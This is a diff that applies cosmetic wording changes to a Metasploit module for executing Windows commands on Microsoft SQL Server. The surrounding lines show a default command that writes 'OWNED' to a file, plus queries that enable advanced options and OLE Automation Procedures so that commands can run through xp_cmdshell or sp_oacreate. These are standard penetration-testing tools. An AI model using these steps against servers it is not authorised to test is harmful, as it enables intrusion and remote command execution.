@@ -12,9 +12,9 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Microsoft SQL Server Command Execution',
         'Description' => %q{
-          This module will execute a Windows command on a MSSQL/MSDE instance
-          via the xp_cmdshell (default) or the sp_oacreate procedure (more opsec safe, no output, no temporary data table).
-          A valid username and password is required to use this module.
+          This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell (default) or the
+          sp_oacreate procedure (more opsec safe, no output, no temporary data table). A valid username and password is
+          required to use this module.
         },
         'Author' =>
           [
@@ -32,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('CMD', [ false, 'Command to execute', 'cmd.exe /c echo OWNED > C:\\owned.exe']),
-      OptEnum.new('TECHNIQUE', [true, 'Technique that used for command execution', 'xp_cmdshell', ['xp_cmdshell', 'sp_oacreate']])
+      OptEnum.new('TECHNIQUE', [true, 'Technique to use for command execution', 'xp_cmdshell', ['xp_cmdshell', 'sp_oacreate']])
     ])
   end
 
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def mssql_spoacreate
     doprint = datastore['VERBOSE']
-    print_status('Enable advanced options and ole automation procedures')
+    print_status('Enabling advanced options and ole automation procedures.')
     mssql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", doprint)
     mssql_query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", doprint)
     print_good('Executing command using sp_oacreate. No output will be displayed.')
